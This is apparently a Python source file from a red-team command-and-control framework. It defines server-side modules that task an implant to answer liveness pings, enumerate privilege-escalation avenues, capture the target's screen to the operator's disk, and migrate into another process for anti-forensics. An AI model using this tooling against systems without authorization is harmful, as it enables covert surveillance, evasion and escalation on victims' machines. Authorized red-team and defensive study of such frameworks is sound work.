"""Built-in modules that wrap structured agent actions.

The implant already knows how to answer ``ping``, ``privesc_suggest``,
``screenshot`` and ``migrate`` — see ``agent.core.stub`` — and the queue already
gates them by declared capability (``sessions.capabilities``). What was missing
was a module wrapper for each, so an operator could only fire those actions as
raw typed verbs at ``sessions interact``. As modules they become auditable,
runnable as background jobs, dispatchable across every session with
``execute_on_all``, and they return parsed structure for the report rather than
a blob of text.

Every module here dispatches through ``transfer.run_action`` and treats a
refusal, a timeout and a malformed reply as failures — never as an empty success.
"""
from __future__ import annotations

import base64
import os
import time
from typing import Any, Dict

from pupyteer.server.modules.registry import PupyModule, ModuleCategory
from pupyteer.server.sessions import transfer
from pupyteer.server.modules.builtin.recon import _command_timeout, _no_agent


class PingModule(PupyModule):
    """Confirm a session is alive and answering tasking."""

    name = "ping"
    version = "1.0.0"
    description = "Liveness check: confirm the agent on a session replies"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "ping"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}
        if not reply.get("pong"):
            return {
                "status": "error",
                "error": f"agent replied but not to a ping: {str(reply)[:200]}",
            }
        return {"status": "ok", "agent_id": reply.get("id"), "responsive": True}


class PrivescModule(PupyModule):
    """Run the agent's privilege-escalation enumeration and report findings.

    This is collection for an authorized assessment: it reads the host's own
    privilege state (euid/admin, SUID binaries, UAC level, service paths) and the
    agent's suggested avenues. It does not run any exploit.
    """

    name = "privesc"
    version = "1.0.0"
    description = "Enumerate privilege-escalation posture (check + suggested avenues)"
    author = "Pupyteer Team"
    category = ModuleCategory.RED_TEAM

    MODES = ("check", "suggest")

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        mode = args.get("mode", "suggest")
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        action = "privesc_check" if mode == "check" else "privesc_suggest"
        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": action},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"], "mode": mode}

        if mode == "check":
            # The check handler returns the findings dict directly.
            return {"status": "ok", "mode": mode, "check": reply}

        # privesc_suggest wraps {"check": {...}, "suggestions": [...]}.
        check = reply.get("check")
        suggestions = reply.get("suggestions")
        if not isinstance(check, dict) or not isinstance(suggestions, list):
            return {
                "status": "error",
                "error": f"agent sent no structured privilege report: {str(reply)[:200]}",
                "mode": mode,
            }
        return {"status": "ok", "mode": mode, "check": check,
                "suggestions": suggestions}

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        mode = args.get("mode", "suggest")
        if mode not in self.MODES:
            return [f"mode must be one of: {', '.join(self.MODES)}"]
        return []


class ScreenshotModule(PupyModule):
    """Capture the target's screen and save it to the operator's machine.

    The agent returns the PNG inline (base64), so this writes it straight to
    disk instead of shipping pixels through every result viewer. A capture the
    agent could not take — a headless host, an image that failed to decode —
    comes back as an error, not a zero-byte file.
    """

    name = "screenshot"
    version = "1.0.0"
    description = "Capture the target screen and save a PNG on the operator host"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "screenshot"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        encoded = reply.get("data", "")
        if not encoded:
            return {
                "status": "error",
                "error": f"agent returned no image data: {str(reply)[:200]}",
            }
        try:
            raw = base64.b64decode(encoded, validate=True)
        except (base64.binascii.Error, TypeError, ValueError) as exc:
            return {"status": "error", "error": f"agent sent data that is not base64: {exc}"}
        if not raw:
            return {"status": "error", "error": "decoded image was empty"}

        local_path = args.get("local_path") or _default_shot_path(session)
        parent = os.path.dirname(os.path.abspath(local_path))
        os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as sink:
            sink.write(raw)

        return {
            "status": "ok",
            "local_path": local_path,
            "format": reply.get("format", "png"),
            "bytes_written": len(raw),
            "bytes_reported": reply.get("bytes"),
        }


def _default_shot_path(session: Any) -> str:
    sid = getattr(session, "session_id", "session") or "session"
    return os.path.join("artifacts", f"screenshot-{sid}-{int(time.time())}.png")


class MigrateModule(PupyModule):
    """Move the implant into another process on the target.

    A standard anti-forensics / stability action the agent already implements.
    The operator names a target process (PID or name) and optionally a
    technique; everything else — resolving the PID and picking a technique per
    platform — is the agent's decision, and its answer is relayed verbatim.
    """

    name = "migrate"
    version = "1.0.0"
    description = "Migrate the agent into a target process (PID or name)"
    author = "Pupyteer Team"
    category = ModuleCategory.RED_TEAM

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        target = str(args.get("target", "")).strip()
        if not target:
            return {"status": "error", "error": "target (PID or process name) is required"}
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        task: Dict[str, Any] = {"action": "migrate", "target": target}
        technique = args.get("technique")
        if technique:
            task["technique"] = str(technique)

        reply = await transfer.run_action(
            session_mgr, session.session_id, task,
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"], "target": target}
        if not reply.get("ok"):
            return {
                "status": "error",
                "error": reply.get("error", "the agent refused the migration"),
                "target": target,
            }
        return {"status": "ok", "target": target, "detail": reply}

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not str(args.get("target", "")).strip():
            return ["Missing required argument: target"]
        return []
